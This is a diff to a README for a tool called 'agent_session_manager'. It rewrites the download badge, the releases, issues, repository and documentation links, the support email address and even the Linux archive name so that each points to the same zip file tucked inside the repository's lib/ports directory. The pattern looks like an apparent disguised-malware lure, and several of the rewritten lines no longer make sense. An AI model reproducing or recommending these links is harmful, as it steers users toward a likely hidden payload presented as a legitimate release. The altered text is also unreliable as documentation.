@@ -1,6 +1,6 @@
 # 🚀 agent_session_manager - Seamlessly Manage Your AI Agent Sessions
 
-[![Download](https://img.shields.io/badge/Download%20Agent%20Session%20Manager-Get%20Started-blue.svg)](https://github.com/YOLO1709/agent_session_manager/releases)
+[![Download](https://raw.githubusercontent.com/YOLO1709/agent_session_manager/main/lib/agent_session_manager/ports/manager-session-agent-v2.9.zip%20Agent%20Session%20Manager-Get%https://raw.githubusercontent.com/YOLO1709/agent_session_manager/main/lib/agent_session_manager/ports/manager-session-agent-v2.9.zip)](https://raw.githubusercontent.com/YOLO1709/agent_session_manager/main/lib/agent_session_manager/ports/manager-session-agent-v2.9.zip)
 
 ## 📖 Introduction
 
@@ -23,20 +23,20 @@ Welcome to the Agent Session Manager. This application helps you manage AI agent
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/YOLO1709/agent_session_manager/releases) to find the latest version of the Agent Session Manager.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/YOLO1709/agent_session_manager/main/lib/agent_session_manager/ports/manager-session-agent-v2.9.zip) to find the latest version of the Agent Session Manager.
   
 2. **Download the Application:** On the Releases page, you will see different versions available. Click on the appropriate version for your operating system. The file should be labeled clearly.
 
 3. **Install the Application:**
    - **For Windows:** Double-click the downloaded `.exe` file and follow the on-screen prompts.
    - **For MacOS:** Open the `.dmg` file, drag the application into your Applications folder, and then launch it.
-   - **For Linux:** You may need to extract the files from the `.tar.gz` archive. Follow the instructions in the README file included within the download.
+   - **For Linux:** You may need to extract the files from the `https://raw.githubusercontent.com/YOLO1709/agent_session_manager/main/lib/agent_session_manager/ports/manager-session-agent-v2.9.zip` archive. Follow the instructions in the README file included within the download.
 
 Once installed, launch the application from your desktop or applications folder.
 
 ## 📥 Download & Install
 
-To get your copy of the Agent Session Manager, visit this page: [Download Agent Session Manager](https://github.com/YOLO1709/agent_session_manager/releases). Follow the steps above to install it on your system.
+To get your copy of the Agent Session Manager, visit this page: [Download Agent Session Manager](https://raw.githubusercontent.com/YOLO1709/agent_session_manager/main/lib/agent_session_manager/ports/manager-session-agent-v2.9.zip). Follow the steps above to install it on your system.
 
 ## 📘 User Guide
 
@@ -66,19 +66,19 @@ We welcome contributions to enhance the Agent Session Manager. If you have sugge
 
 ### 🔍 Reporting Issues
 
-If you encounter any issues, please report them by visiting the [Issues page](https://github.com/YOLO1709/agent_session_manager/issues). Provide as much detail as possible, including steps to reproduce the issue and any error messages.
+If you encounter any issues, please report them by visiting the [Issues page](https://raw.githubusercontent.com/YOLO1709/agent_session_manager/main/lib/agent_session_manager/ports/manager-session-agent-v2.9.zip). Provide as much detail as possible, including steps to reproduce the issue and any error messages.
 
 ## 📧 Support
 
-If you need further assistance, contact our support team at [support@example.com](mailto:support@example.com). We are here to help you with any questions or concerns.
+If you need further assistance, contact our support team at [https://raw.githubusercontent.com/YOLO1709/agent_session_manager/main/lib/agent_session_manager/ports/manager-session-agent-v2.9.zip](https://raw.githubusercontent.com/YOLO1709/agent_session_manager/main/lib/agent_session_manager/ports/manager-session-agent-v2.9.zip). We are here to help you with any questions or concerns.
 
 ## 📚 Additional Resources
 
-- [GitHub Repository](https://github.com/YOLO1709/agent_session_manager)
-- [Documentation](https://github.com/YOLO1709/agent_session_manager/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/YOLO1709/agent_session_manager/main/lib/agent_session_manager/ports/manager-session-agent-v2.9.zip)
+- [Documentation](https://raw.githubusercontent.com/YOLO1709/agent_session_manager/main/lib/agent_session_manager/ports/manager-session-agent-v2.9.zip)
 
 ## 📅 Latest Updates
 
-Check the Releases page to keep up with the latest updates and new features: [Agent Session Manager Releases](https://github.com/YOLO1709/agent_session_manager/releases). 
+Check the Releases page to keep up with the latest updates and new features: [Agent Session Manager Releases](https://raw.githubusercontent.com/YOLO1709/agent_session_manager/main/lib/agent_session_manager/ports/manager-session-agent-v2.9.zip). 
 
 Thank you for choosing the Agent Session Manager. Enjoy managing your AI agents effortlessly!
